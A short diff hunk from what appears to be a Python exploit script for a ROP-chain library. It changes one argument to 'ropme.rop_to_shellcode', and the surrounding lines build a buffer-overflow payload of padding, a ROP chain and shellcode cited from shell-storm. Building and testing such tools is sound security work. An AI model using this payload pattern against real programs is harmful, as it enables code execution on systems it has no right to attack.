@@ -25,7 +25,7 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
 target_address = buffer_address + 1024
 print "shellcode ({} bytes) address: 0x{:x}".format(len(shellcode), target_address)
 
-rop = ropme.rop_to_shellcode([(filename, None, 0)], [], target_address)
+rop = ropme.rop_to_shellcode([(filename, None, None)], [], target_address)
 
 payload = 'A'*512 + 'B'*8 + rop
 payload += ((1024 - len(payload)) * 'B') + shellcode
